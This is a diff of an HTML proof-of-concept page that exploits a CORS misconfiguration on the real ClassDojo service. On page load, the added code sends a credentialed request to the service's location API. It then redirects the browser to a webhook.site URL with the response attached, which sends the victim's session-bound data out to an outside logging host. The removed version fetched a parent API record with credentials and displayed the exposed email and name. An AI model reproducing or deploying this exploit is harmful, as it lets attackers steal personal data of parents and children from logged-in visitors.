@@ -3,43 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malicious Website</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: #f4f4f4;
-        }
-        h1 {
-            color: #333;
-        }
-    </style>
+    <title>Malicious Script</title>
 </head>
 <body>
-    <h1>Malicious Site - Exploit CORS Vulnerability</h1>
-    <p>If you see this page, it means the CORS misconfiguration is being exploited!</p>
-
-    <button onclick="fetchData()">Click to Fetch Sensitive Data</button>
-
+    <h1>Welcome to the page</h1>
     <script>
-        function fetchData() {
-            const apiUrl = 'https://home.classdojo.com/api/parent/6798a8ab3a917cd65ad39235';  // URL of the vulnerable API
+        var req = new XMLHttpRequest(); 
+        req.onload = reqListener; 
+        req.open('GET', 'https://home.classdojo.com/api/location', true); 
+        req.withCredentials = true; // Send cookies with the request
+        req.send();
 
-            fetch(apiUrl, {
-                method: 'GET',  // Or 'POST', depending on the API endpoint you're targeting
-                credentials: 'include'  // Ensure cookies are sent with the request (important for session-based auth)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Exposed Data:', data);
-                document.body.innerHTML += `<p>Exposed User Email: ${data.emailAddress}</p><p>Exposed User Name: ${data.firstName}</p>`;
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Error fetching data!');
-            });
-        }
+        function reqListener() {
+            // Send the response to your Webhook.site for logging
+            location = 'https://webhook.site/77be87a4-2b5c-4a85-a81b-cec771bd6a73?key=' + encodeURIComponent(this.responseText);
+        };
     </script>
 </body>
 </html>
